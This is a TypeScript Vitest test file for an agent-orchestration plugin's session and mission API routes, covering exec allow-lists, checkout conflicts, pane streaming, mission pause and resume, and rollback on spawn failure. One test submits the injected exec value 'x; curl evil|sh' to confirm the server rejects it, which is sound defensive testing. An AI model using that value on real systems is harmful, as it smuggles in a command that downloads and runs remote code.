// @vitest-environment node
/** Adopted from the Elowen package: the `/sessions` and `/missions` tests of tests/api/server.test.ts.
 *
 *  Everything else in that file — /health, /events, /config, the body cap, the sub-agent pool — is the
 *  daemon's own surface and stayed there. These launch, stream and pause through routes THIS plugin root-
 *  mounts, over the real spawn service and mission engine. */
import { describe, it, expect } from 'vitest';
import type { ElowenEvent } from 'elowen/dist/api/sse.js';
import { KNOWN_EXECS } from '../plugins/agents/dist/lib/execs.js';
import { makeDomainApp } from './helpers/domainApp.js';

describe('agents plugin: session + mission routes on a daemon-shaped app', () => {
  it('POST /sessions with invalid exec returns 400 and spawns nothing', async () => {
    const { app, token, deps } = await makeDomainApp();
    deps.tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
    const res = await app.request('/sessions', { method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'x; curl evil|sh' }) });
    expect(res.status).toBe(400);
    expect(await res.json()).toMatchObject({ error: 'exec not allowed' });
    expect(await deps.tmux.list()).toHaveLength(0);
  });


  it('POST /sessions launches an agent on a task and marks it in_progress', async () => {
    const { app, token, deps } = await makeDomainApp();
    deps.config.update({ allowedExecs: [...KNOWN_EXECS] });
    deps.tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
    const res = await app.request('/sessions', { method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'opencode:ollama-cloud/deepseek-v4-flash' }) });
    expect(res.status).toBe(201);
    const body = await res.json();
    expect(body.session).toMatch(/^elowen-/);
    expect(deps.tasks.get('elowen-1')?.status).toBe('in_progress');
    expect(await deps.tmux.list()).toContain(body.session);
    // spawn tags the task with exec + agent labels so the UI can show its model and link the session
    const t1 = deps.tasks.get('elowen-1')!;
    expect(t1.labels).toContain('exec:opencode:ollama-cloud/deepseek-v4-flash');
    expect(t1.labels.some((l) => l.startsWith('agent:'))).toBe(true);
  });


  it('POST /sessions refuses to launch into a shared checkout another agent already holds (409)', async () => {
    const { app, token, deps } = await makeDomainApp();
    deps.tasks.create({ id: 'busy', project_id: 1, title: 'Busy' });
    deps.tasks.setStatus('busy', 'in_progress'); // a live agent already owns the project's shared checkout
    deps.tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
    const res = await app.request('/sessions', { method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'sonnet' }) });
    expect(res.status).toBe(409); // single-writer: don't double-occupy the checkout
    expect(deps.tasks.get('elowen-1')?.status).toBe('open'); // not flipped
    expect(await deps.tmux.list()).toHaveLength(0);         // nothing spawned
  });


  it('GET /sessions tags each live session with its project from the agent store', async () => {
    const { app, token, deps } = await makeDomainApp();
    deps.config.update({ allowedExecs: [...KNOWN_EXECS] });
    deps.tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
    await app.request('/sessions', { method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'opencode:ollama-cloud/deepseek-v4-flash' }) });
    const sessions = await (await app.request('/sessions', { headers: { authorization: `Bearer ${token}` } })).json();
    expect(sessions).toHaveLength(1);
    // the daemon resolves the session's repo from the agent store (works for every role, not just workers)
    expect(sessions[0].projectId).toBe(1);
  });


  it('PATCH /missions/:id pauses (drops from active) and resumes', async () => {
    // Served by the agents plugin's root-mounted routes: the REAL engine pauses (kills agents, reverts
    // tasks) and resumes over the shared stores.
    const { app, token, deps } = await makeDomainApp();
    const { missionId } = deps.seedMissionWithChild();
    const patch = (body: object) => ({ method: 'PATCH', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify(body) });
    await app.request(`/missions/${missionId}`, patch({ action: 'pause' }));
    expect((await (await app.request('/missions', { headers: { authorization: `Bearer ${token}` } })).json())).toEqual([]); // paused → not active
    expect(deps.missions.get(missionId)?.state).toBe('paused');
    await app.request(`/missions/${missionId}`, patch({ action: 'resume' }));
    expect(deps.missions.get(missionId)?.state).toBe('active');
  });

  it('POST /sessions rejects an exec disallowed by config', async () => {
    const { app, token, deps } = await makeDomainApp();
    deps.tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
    deps.config.update({ allowedExecs: ['sonnet'] }); // only sonnet allowed
    const res = await app.request('/sessions', { method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'codex:gpt-5.4' }) });
    expect(res.status).toBe(400);
    expect(await deps.tmux.list()).toEqual([]);
  });


  it('GET /sessions/:name/stream survives a dead/missing session (empty pane)', async () => {
    const { app, token } = await makeDomainApp(); // no pane set for 'elowen-dead' → returns ''
    const ctrl = new AbortController();
    const res = await app.request('/sessions/elowen-dead/stream', { signal: ctrl.signal, headers: { authorization: `Bearer ${token}` } });
    expect(res.status).toBe(200);
    expect(res.headers.get('content-type')).toContain('text/event-stream');
    const reader = res.body!.getReader();
    const { value } = await reader.read();
    const text = new TextDecoder().decode(value);
    expect(text).toContain('event: pane');
    // empty pane: data contains {"pane":""}, stream must not throw
    expect(text).toContain('"pane"');
    ctrl.abort(); await reader.cancel();
  });


  it('GET /sessions/:name/stream emits a first pane frame', async () => {
    const { app, token, deps } = await makeDomainApp();
    deps.tmux.setPane('elowen-A', 'hello-pane');
    const ctrl = new AbortController();
    const res = await app.request('/sessions/elowen-A/stream', { signal: ctrl.signal, headers: { authorization: `Bearer ${token}` } });
    expect(res.status).toBe(200);
    expect(res.headers.get('content-type')).toContain('text/event-stream');
    const reader = res.body!.getReader();
    const { value } = await reader.read();
    const text = new TextDecoder().decode(value);
    expect(text).toContain('event: pane');
    expect(text).toContain('hello-pane');
    ctrl.abort(); await reader.cancel();
  });

  it('GET /missions/:id returns 404 for unknown mission', async () => {
    const { app, token } = await makeDomainApp();
    const res = await app.request('/missions/unknown', { headers: { authorization: `Bearer ${token}` } });
    expect(res.status).toBe(404);
  });

  it('GET /missions/:id returns mission detail for a seeded mission', async () => {
    const { app, token, deps } = await makeDomainApp();
    deps.tasks.create({ id: 'epic', project_id: 1, title: 'E', type: 'epic' });
    deps.missions.create({ id: 'm1', epic_id: 'epic', autonomy: 'low', max_sessions: 1 });
    const res = await app.request('/missions/m1', { headers: { authorization: `Bearer ${token}` } });
    expect(res.status).toBe(200);
    const body = await res.json() as { epic: { id: string }; progress: { total: number } };
    expect(body.epic.id).toBe('epic');
    expect(body.progress.total).toBe(0);
  });

  it('POST /sessions reverts the task to open when spawn.launch fails', async () => {
    const { app, token, deps } = await makeDomainApp();
    deps.tasks.create({ id: 'elowen-s1', project_id: 1, title: 'T', description: 'd' });
    deps.tmux.spawn = async () => { throw new Error('tmux exploded'); };
    const events: ElowenEvent[] = []; deps.bus.subscribe((e) => events.push(e));
    const res = await app.request('/sessions', { method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-s1' }) });
    expect(res.status).toBe(500);
    expect(deps.tasks.get('elowen-s1')!.status).toBe('open'); // reverted, not left stuck in_progress
    expect(events.some((e) => e.type === 'task' && e.taskId === 'elowen-s1' && e.status === 'open')).toBe(true);
  });
});
